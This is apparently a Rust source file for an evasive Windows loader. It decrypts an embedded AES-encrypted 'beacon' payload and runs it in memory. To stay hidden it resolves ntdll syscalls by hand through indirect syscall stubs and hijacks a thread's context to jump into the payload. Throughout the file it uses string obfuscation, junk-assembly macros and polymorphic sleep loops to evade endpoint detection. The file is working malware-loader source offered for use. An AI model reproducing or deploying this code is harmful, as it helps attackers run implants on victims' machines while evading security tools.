#![no_main]
#![windows_subsystem = "console"]
#![allow(non_snake_case)]

use winapi::shared::ntdef::ULONG;
use std::slice;
use std::include_bytes;
use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE},
        lmaccess::{ACCESS_ALL}
    },
    shared::{
        ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS}
    }
};
use ntapi::{ntpebteb::PTEB, ntldr::{PLDR_DATA_TABLE_ENTRY}, ntpsapi::PEB_LDR_DATA};
use core::arch::asm;
use winapi::ctypes::c_void;
use std::ffi::CString;
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
use core::arch::global_asm;
use winapi::um::winnt::{THREAD_SUSPEND_RESUME, THREAD_SET_CONTEXT, THREAD_GET_CONTEXT};
use std::collections::BTreeMap;
use winapi::shared::minwindef::LPDWORD;
use winapi::um::winnt::ACCESS_MASK;
use std::mem::transmute;
use winapi::um::processthreadsapi::GetExitCodeThread;
use winapi::shared::ntdef::PULONG;
use ntapi::ntrtl::PUSER_THREAD_START_ROUTINE;
use std::hint;
use std::sync::Mutex;
use std::mem;
use ntapi::ntpsapi::PS_ATTRIBUTE_LIST;
use std::env;
use std::{ptr::null_mut};
use winapi::{um::{winnt::{PIMAGE_DOS_HEADER, IMAGE_NT_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_DOS_SIGNATURE, IMAGE_DIRECTORY_ENTRY_EXPORT, PIMAGE_NT_HEADERS}}};
use winapi::um::winnt::PIMAGE_NT_HEADERS64;
use winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
use winapi::um::winnt::PIMAGE_EXPORT_DIRECTORY;
use std::ffi::CStr;
use ntapi::ntapi_base::CLIENT_ID;
use ntapi::ntpsapi::INITIAL_TEB;
use ntapi::ntpsapi::INITIAL_TEB_OldInitialTeb;
use ntapi::ntpsapi::THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER;
//use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;
use winapi::shared::ntdef::NULL;
use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut};

use hex_literal::hex;
use aes::cipher::{AsyncStreamCipher, KeyIvInit};
use spam_asm::spam_asm;
use aes::Aes256;
use std::time::Duration;
use std::time::Instant;
type Aes256CbCDec = cbc::Decryptor<Aes256>;
use winapi::um::processthreadsapi::THREAD_INFORMATION_CLASS;
use ntapi::ntpsapi::THREADINFOCLASS;
use winapi::ctypes::c_ulong;

macro_rules! generate_branches {   
    ($count:expr) => {{   
        #[allow(unused_assignments)]  
        let mut result = 0; 
        for i in 0..$count {   
            match std::env::consts::ARCH {   
                "x86_64" => result += i,   
                "arm" => result -= i,   
                _ => result *= i,   
            }   
        }   
        result   
    }};   
 }   

struct Phase2ThreadParams {
    value: u32,
    mainThreadID: DWORD,
    sorted_syscalls: Vec<(String, (usize,u16))>

}

struct ThreadParams {
    data: Vec<u8>,
    value: u32,
    mainThreadID: DWORD
}


global_asm!(
    "
{!ASN_stub_code_here}
    "
);

use winapi::um::winnt::PAGE_EXECUTE_READ;
use obfstr::obfstr;

use std::thread;
use winapi::shared::minwindef::LPVOID;
use std::ptr;
use winapi::um::processthreadsapi::CreateThread;
use winapi::shared::minwindef::DWORD;
use winapi::shared::ntdef::NTSTATUS;

extern "C" {
    pub fn syscall_exec(ssn: u16, syscall_address: usize, arg_count: u32, ...) -> i32;
}

#[no_mangle]
#[spam_asm]
#[inline(never)]
unsafe fn polymorphic_sleep_1(){
    while(true){ 
        unsafe{ asm!("pand mm0, mm0"); }}
}

#[no_mangle]
#[spam_asm]
#[inline(never)]
unsafe fn polymorphic_sleep_2(){
    while(true){ 
        unsafe{ asm!("por mm1, mm1"); 
                asm!("nop"); 
        }
    }
}

#[no_mangle]
#[spam_asm]
#[inline(never)]
unsafe fn polymorphic_sleep_3(){
    while(true){ 
        unsafe{ asm!("nop"); 
        }
    }
}

#[no_mangle]
#[spam_asm]
#[inline(never)]
unsafe fn polymorphic_sleep_4(){
    while(true){ 
        unsafe{ asm!("por mm2, mm2"); 
        }
    }
}

use rand::prelude::*;

#[no_mangle]
#[inline(never)]
fn check_routine() -> u32{
    let mut rng = rand::thread_rng();
    let y: u32 = rng.gen_range(0..=6);
    // // // println!("{:?}", y);
    return y;
}

#[spam_asm]
#[inline(never)]
extern "system" fn phase_2_exec_external_code(param: LPVOID) -> DWORD { 
    //let params: Box<Phase2ThreadParams> = unsafe { Box::from_raw(param as *mut Phase2ThreadParams) };
   // let procID = params.value;
   // let mainThread = params.mainThreadID;
   // let sorted_sys = params.sorted_syscalls;
   unsafe{
        while true{
            asm!("nop");
        }
   }
    0
}

fn sleep_func(){
    unsafe {
        let mut hit = false;
        let mut time_in_future = 0;

        while true{

            std::hint::spin_loop();
            let instant2 = Instant::now(); // get RDTSC (loop)
            

            let instant_bytes: [u8; mem::size_of::<Instant>()] = mem::transmute(instant2);
            let ptr = instant_bytes.as_ptr();
            let tv_sec_ptr = ptr as *const u64; // extracting tv_sec from RDTSC return 

            if hit == false{
                hit = true;
                time_in_future = *tv_sec_ptr + 3; // previous captured RDTSC (tv_sec) + 20 (seconds)
            }

            std::hint::spin_loop();
            if (*tv_sec_ptr) > time_in_future{
                break
            }
        }

    }
}


#[spam_asm]
#[inline(never)]
extern "system" fn enhance(param: LPVOID) -> DWORD { 
    let params: Box<ThreadParams> = unsafe { Box::from_raw(param as *mut ThreadParams) };

    let mut buf = params.data;
    let procID = params.value;
    let mainThread = params.mainThreadID;

    
    let ntdll_base = unsafe{
        get_ntdll_base()
    };

    let mut nt_exports = BTreeMap::new();
    for (name, addr) in unsafe { get_module_address(ntdll_base) } {
        // // // println!("{:?}", name);
        if name.starts_with("Zw") {
            nt_exports.insert(name.replace("Zw", "Nt"), addr);
        }
    }
    let mut nt_exports_vec: Vec<(String, usize)> = Vec::from_iter(nt_exports);
    nt_exports_vec.sort_by_key(|k| k.1);

    let mut syscall_number: u16 = 0;
    let mut resolved_syscalls = BTreeMap::new();

    for exports in nt_exports_vec {
        let mut ssn = 0;
        let (syscall_instruction, ssn) = unsafe { search_address(exports.1 as _) };
        resolved_syscalls.insert(
            exports.0,
            (syscall_instruction, ssn)
        );
    }
    let mut currentProcess  : HANDLE = -1isize as _;
    let mut sorted_syscalls: Vec<(String, (usize,u16))> = Vec::from_iter(resolved_syscalls.clone());
    sorted_syscalls.sort_by_key(|&(_, (_, val))| val);
    

    unsafe {
        use winapi::um::winnt::{CONTEXT, CONTEXT_FULL, CONTEXT_CONTROL, CONTEXT_INTEGER};
        let mut oa2 = OBJECT_ATTRIBUTES::default();
        let mut ci2 = CLIENT_ID {
            UniqueProcess: procID as *mut c_void,
            UniqueThread: mainThread as *mut c_void,
        };
 
        let mut thread_handle : *mut c_void = null_mut();
        let open_status = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtOpenThread").to_string(), &mut thread_handle, THREAD_SUSPEND_RESUME| THREAD_SET_CONTEXT| THREAD_GET_CONTEXT, &oa2, &ci2);
    
        let mut lpContext: CONTEXT = CONTEXT {
             ContextFlags: CONTEXT_CONTROL | CONTEXT_INTEGER,
             ..Default::default()
        };
 
        let thread_context_get = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtGetContextThread").to_string(), thread_handle,  &mut lpContext);
 
        let mut allocstart : *mut c_void = null_mut();
        let mut size : usize = buf.len();
        let mut alloc_status = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtAllocateVirtualMemory").to_string(), currentProcess, &mut allocstart, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        while alloc_status != 0{
            alloc_status = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtAllocateVirtualMemory").to_string(), currentProcess, &mut allocstart, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        }

        let mut shared_page_size : usize = 131072;
        let mut shared_pageallocstart : *mut c_void = 0xB16B00B0 as *mut c_void;
        let mut alloc_shared_memorypage = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtAllocateVirtualMemory").to_string(), currentProcess, &mut shared_pageallocstart, 0, &mut shared_page_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        while alloc_shared_memorypage != 0{
            alloc_shared_memorypage = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtAllocateVirtualMemory").to_string(), currentProcess, &mut shared_pageallocstart, 0, &mut shared_page_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        }
        // // println!("[1] shared memory page status: 0x{:08X}", alloc_shared_memorypage);


        let mut shared_page_size_2 : usize = 20480;
        let mut shared_pageallocstart_2 : *mut c_void = 0xBAADF000 as *mut c_void;
        let mut alloc_shared_memorypage_2 = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtAllocateVirtualMemory").to_string(), currentProcess, &mut shared_pageallocstart_2, 0, &mut shared_page_size_2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        while alloc_shared_memorypage_2 != 0{
            alloc_shared_memorypage_2 = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtAllocateVirtualMemory").to_string(), currentProcess, &mut shared_pageallocstart_2, 0, &mut shared_page_size_2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        }
        // // println!("[2] shared memory page status: 0x{:08X}", alloc_shared_memorypage_2);

        let mut byteswritten = 0;
        let buffer = buf.as_mut_ptr() as *mut c_void;
        let mut buffer_length = buf.len();
        let write_status = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtWriteVirtualMemory").to_string(), currentProcess, allocstart, buffer, buffer_length, &mut byteswritten);

        let mut old_perms = PAGE_READWRITE;
        let protect_status = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtProtectVirtualMemory").to_string(), currentProcess, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READ, &mut old_perms);

        lpContext.Rip = allocstart as u64;
        let threadBase: u64 = lpContext.R10;
 
        let thread_context_set = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtSetContextThread").to_string(), thread_handle,  &mut lpContext);


        let mut lpContext_initial_beacon: CONTEXT = CONTEXT {
            ContextFlags: CONTEXT_CONTROL | CONTEXT_INTEGER,
            ..Default::default()
       };
        let mut lpContext_2: CONTEXT = CONTEXT {
                ContextFlags: CONTEXT_CONTROL | CONTEXT_INTEGER,
                ..Default::default()
        };   

        let mut flag = 0;
        let mut thread_handle_2 : *mut c_void = null_mut();
        let mut oa2 = OBJECT_ATTRIBUTES::default();
        let mut client_Id = CLIENT_ID {
            UniqueProcess: procID as *mut c_void,
            UniqueThread: mainThread as *mut c_void,
        };

        let mut lpContext_2: CONTEXT = CONTEXT {
            ContextFlags: CONTEXT_CONTROL | CONTEXT_INTEGER,
            ..Default::default()
        };

        let start_routine = Some(phase_2_exec_external_code).unwrap() as *mut c_void;
        let attribute_list: *mut PS_ATTRIBUTE_LIST = std::ptr::null_mut();
        let object_attributes: *mut OBJECT_ATTRIBUTES = std::ptr::null_mut();

        let mut plungo_shooooo: PULONG = null_mut();
        let mut suspend_count_remote_thread: c_ulong = 0;
        let mut len: ULONG = 0;
        
        loop{
            let address_cafebabe: *const u32 = 0xBAADF000 as *const u32;
            let address: *const u8 = 0xB16B00B0 as *const u8;

            let value: u8 = std::ptr::read_volatile(address);
            let value_cafebabe: u32 = std::ptr::read_volatile(address_cafebabe);
            
            let s = CString::new("").expect("CString::new failed");
            let s_ptr: *mut c_void = s.into_raw() as *mut c_void;

            // check if thread has ended and save suspend counter for further checkings
            // thread end = suspend state and state flag == 0
            if thread_handle_2 != null_mut(){
                let nt_query_info_thread = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtQueryInformationThread").to_string(), 
                    thread_handle_2, 
                    35,  
                    &mut suspend_count_remote_thread as *mut c_ulong as *mut _,  
                    std::mem::size_of_val(&suspend_count_remote_thread) as u32,
                    ptr::null_mut::<c_void>()
                ); 
                // // println!("[3] nt_query_info_thread: 0x{:08X}", nt_query_info_thread);
                // // println!("suspend count: {:?}", suspend_count_remote_thread);
            }


            // start a fresh thread if no thread running and if memory has code
            // // println!("flag: {:?} - memory _ flag: {:?} - suspend count: {:?} - memory_code: {:?}", flag, value_cafebabe, suspend_count_remote_thread, value);
            if flag == 0 && value_cafebabe == 0 && value != 0{
                    // // println!("Spawning new thread...");
                    let address_2 = 0xBAADF000 as *mut u8;
                    flag = 1;
                    let mut old_perms = PAGE_READWRITE;
                    let protect_status = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtProtectVirtualMemory").to_string(), currentProcess, &mut shared_pageallocstart, &mut shared_page_size, PAGE_EXECUTE_READ, &mut old_perms); // 0x00000001 = THREAD_CREATE_FLAGS_CREATE_SUSPENDED
                    let status_NtCreateThreadEx = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtCreateThreadEx").to_string(), 
                            &mut thread_handle_2, 
                            0x1FFFFF,
                            null_mut::<c_void>(), 
                            currentProcess, start_routine, 
                            s_ptr, 
                            0 as usize, 0 as usize, 0 as usize, null_mut::<c_void>() 
                    );
                    let nt_resume_thread = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtResumeThread").to_string(), thread_handle_2,  &mut plungo_shooooo);
                    let thread_context_get = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtGetContextThread").to_string(), thread_handle_2,  &mut lpContext_2);
                    lpContext_2.Rip = 0xB16B00B0 as u64;
                    let thread_context_get = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtSetContextThread").to_string(), thread_handle_2,  &mut lpContext_2);
            }

            unsafe {
                let read_value = std::ptr::read_volatile(address_cafebabe);
                let first_byte = read_value as u8;
                if first_byte == 5{
                    let mut ptr: *mut BTreeMap<String, (usize, u16)> = &mut resolved_syscalls;
                    // // // println!("address of pvoid: {:p}", ptr);
                    let nt_suspend_thread = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtSuspendThread").to_string(), thread_handle_2,  &mut plungo_shooooo);
                    // // // println!("[5] NtSuspendThread: 0x{:08X}", nt_suspend_thread);
                    let thread_context_get = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtGetContextThread").to_string(), thread_handle_2,  &mut lpContext_2);
                    // // // println!("[5] NtGetContextThread: 0x{:08X}", thread_context_get);
                    lpContext_2.R14 = ptr as u64;
                    let thread_context_set = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtSetContextThread").to_string(), thread_handle_2,  &mut lpContext_2);
                    // // // println!("[5] NtSetContextThread: 0x{:08X}", thread_context_set);
                    let nt_resume_thread = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtResumeThread").to_string(), thread_handle_2,  &mut plungo_shooooo);
                    
                    let address = 0xBAADF000 as *mut u8;
                    let value: u32 = 6;
                    let bytes = value.to_le_bytes();
                    unsafe {
                        for (i, &byte) in bytes.iter().enumerate() {
                            
                            core::ptr::write_volatile(address.add(i), byte);
                        }
                    }
                    
                    // // // println!("[5] NtResumeThread: 0x{:08X}", nt_resume_thread);

                }

                // thread ended...
                let address: *const u8 = 0xBAADF000 as *const u8;
                let first_byte: u8 = ptr::read_volatile(address);

                if suspend_count_remote_thread == 1 && first_byte == 0{
                    flag = 0;
                    suspend_count_remote_thread = 0;
                    
                    // // println!("one flag. (end of thread)");
                    let nt_terminate_thread = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtTerminateThread").to_string(), thread_handle_2, 0);
     
                    let address = 0xBAADF000 as *mut u8;
                    let value: u32 = 0;
                    let bytes = value.to_le_bytes();

                    unsafe {
                        for (i, &byte) in bytes.iter().enumerate() {
                            core::ptr::write_volatile(address.wrapping_add(i), byte);
                        }
                    }

                    let mut old_perms = PAGE_EXECUTE_READ;
                    let protect_status = syscall_macro!(&sorted_syscalls, &obfstr::obfstr!("NtProtectVirtualMemory").to_string(), currentProcess, &mut shared_pageallocstart, &mut shared_page_size, PAGE_READWRITE, &mut old_perms);
                    
                    let vec: Vec<u8> = vec![0; 131072];
                    let address = 0xB16B00B0 as *mut u8;
                    unsafe {
                        for (i, &byte) in vec.iter().enumerate() {
                            let addr = address.wrapping_add(i);
                            core::ptr::write_volatile(addr, 0);
                        }
                    }
                    
                    thread_handle_2 = null_mut();    
                }

            }
            sleep_func();
        }


    }
    0
}

#[no_mangle]
#[spam_asm]
pub extern "C" fn main() { 
    let args: Vec<String> = env::args().collect();
    let dec_pass = &args[1];
    let buf = include_bytes!("../encrypted_beacon");
    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    let iv = &vec[..16];

    let mut data = &mut vec[16..].to_vec();
    let mut buf = [0u8; 2048];

    let cipher = Aes256CbCDec::new_from_slices(&dec_pass.as_bytes(), &iv).unwrap();
    cipher.decrypt_padded_mut::<Pkcs7>(&mut data).unwrap();

    let padding_length = data[data.len() - 1] as usize;
    let original_length = data.len() - padding_length - 1;
    let plain = &data[..original_length];

    let data = data.to_owned().to_vec();
    let value = 0;

    let mut value = 0;
	unsafe {
		asm!("mov {value}, gs:[0x40]", value = out(reg) value);
	}

    // get current thread ID from TIB (Thread Information Block)

    let mut mainThreadID = 0;
	unsafe {
		asm!("mov {mainThreadID}, gs:[0x48]", mainThreadID = out(reg) mainThreadID);
	}
    

    // get current thread ID from TIB (Thread Information Block)

    let params = ThreadParams { data, value, mainThreadID};

    let mut thread_id: DWORD = 0;

    let thread_handle = unsafe {
        CreateThread(
            ptr::null_mut(),
            0,
            Some(enhance),
            Box::into_raw(Box::new(params)) as LPVOID,
            0,
            &mut thread_id,
        )
    };


    while (true){
        let timeout = Duration::from_secs(420);
        let start = Instant::now();
        while start.elapsed() < timeout {
            let timeout = Duration::from_secs(120);
            let start = Instant::now();
            if start.elapsed() > timeout {
                unsafe{ asm!("nop"); }
            };
        }   
    };
}


const UP: isize = -32;
const DOWN: usize = 32;
static LAST_SSN: Mutex<u16> = Mutex::new(0);

#[macro_export]
macro_rules! syscall_macro {
    ($syscall_table:expr, $syscall_name:expr, $($y:expr), +) => {
        {
        let syscall_name = $syscall_name.clone();
        let syscall_table = $syscall_table;
        
        let mut ssn = syscall_table.iter().find(|(key, _)| key == &syscall_name).map(|(_, value)| value).unwrap();
        let mut arg_count:u32 = 0;
        $(
            let _ = $y;
            arg_count += 1;
        )+
        syscall_exec(ssn.1 as u16, ssn.0 as usize, arg_count, $($y), +)
    }}
}

#[spam_asm]
#[allow(arithmetic_overflow)]
unsafe fn search_address(address: *mut u8) -> (usize, u16){
    let mut last_ssn = LAST_SSN.lock().unwrap();
    let mut last_syscall = 0;
    for x in 0..25 {
        if address.add(x).read() == 0xe9{
            for index in 1..500{
                if(address.add(18 + index * DOWN).read() == 0x0f && address.add(19 + index * DOWN).read() == 0x05 &&
                address.add(20 + index * DOWN).read() == 0xc3){
                    let syscall_instruction = address.add(18 + index * DOWN);
                    let guessed_ssn = *last_ssn + 1;
                    return (syscall_instruction as usize, guessed_ssn as u16);
                }
            }
            return (0 as usize, 0);
        }

        if (address.add(x).read() == 0x4c &&
            address.add(x + 1).read() == 0x8b &&
            address.add(x + 2).read() == 0xd1 &&
            address.add(x + 3).read() == 0xb8)
            {
                let high = address.add(x + 5).read();
                let low  = address.add(x + 4).read();
                let result: u16 = (high as u16) << 8 | low as u16;
                *last_ssn = result;
            }

        if(address.add(x).read() == 0x0f  &&
            address.add(x + 1).read() == 0x05  &&
            address.add(x + 2).read() == 0xc3)
            {
                let syscall_instruction = address.add(x);
                return (syscall_instruction as usize, *last_ssn);
            }
    }
    return (0 as usize, 0);
}

#[spam_asm]
unsafe fn get_module_address(module_base: *mut u8) -> BTreeMap<String, usize> {
    let mut exports = BTreeMap::new();
    let dos_header = module_base as PIMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86_64")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64;

    let export_directory = (module_base as usize
        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
            .VirtualAddress as usize) as *mut IMAGE_EXPORT_DIRECTORY;

    let names = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNames as usize) as *const u32,
        (*export_directory).NumberOfNames as _,
    );

    let functions = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfFunctions as usize) as *const u32,
        (*export_directory).NumberOfFunctions as _,
    );

    let ordinals = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNameOrdinals as usize) as *const u16,
        (*export_directory).NumberOfNames as _,
    );

    for i in 0..(*export_directory).NumberOfNames {
        let name_addr = (module_base as usize + names[i as usize] as usize) as *const i8;

        if let Ok(name) = CStr::from_ptr(name_addr).to_str() {
            let ordinal = ordinals[i as usize] as usize;
            exports.insert(
                name.to_string(),
                module_base as usize + functions[ordinal] as usize,
            );
        }
    }

    return exports;
}

#[spam_asm]
unsafe fn get_ntdll_base() -> *mut u8 {
    let ldr_data = get_peb() as *mut PEB_LDR_DATA;
    let ntdll_bytes: [u16; 10] = [110, 116, 100, 108, 108, 46, 100, 108, 108, 0];
    let mut module_list = (*ldr_data).InLoadOrderModuleList.Flink as PLDR_DATA_TABLE_ENTRY;
    while !(*module_list).DllBase.is_null() {
        let dll_name = (*module_list).BaseDllName.Buffer;
        if compare_raw_str(ntdll_bytes.as_ptr(), dll_name) {
            return (*module_list).DllBase as _;
        }

        module_list = (*module_list).InLoadOrderLinks.Flink as PLDR_DATA_TABLE_ENTRY;
    }
    return std::ptr::null_mut();
}

use std::str;
use num_traits::Num;

#[spam_asm]
pub fn compare_raw_str<T>(s: *const T, u: *const T) -> bool
where
    T: Num + std::fmt::Debug,
{
    unsafe {
        let u_len = (0..).take_while(|&i| !(*u.offset(i)).is_zero()).count();
        let u_slice = core::slice::from_raw_parts(u, u_len);

        let s_len = (0..).take_while(|&i| !(*s.offset(i)).is_zero()).count();
        let s_slice = core::slice::from_raw_parts(s, s_len);



        if s_len != u_len {
            return false;
        }
        for i in 0..s_len {
            if s_slice[i] != u_slice[i] {
                return false;
            }
        }
        return true;
    }
}

#[spam_asm]
fn get_peb() -> usize {
    let teb: PTEB;
	unsafe {
		asm!("mov {teb}, gs:[0x30]", teb = out(reg) teb);
	}
	let teb = unsafe { &mut *teb };
	let peb = unsafe { &mut *teb.ProcessEnvironmentBlock };
	let peb_ldr = peb.Ldr;
    peb_ldr as _
}

#[spam_asm]
pub fn dbj2_hash(buffer: &[u8]) -> u32 {
    let mut hsh: u32 = 5381;
    let mut iter: usize = 0;  
    let mut cur: u8;

    while iter < buffer.len() {
        cur = buffer[iter];
        if cur == 0 {
            iter += 1;
            continue;
        }
        if cur >= ('a' as u8) {
            cur -= 0x20;
        }
        hsh = ((hsh << 5).wrapping_add(hsh)) + cur as u32;
        iter += 1;
    }
    return hsh;
}
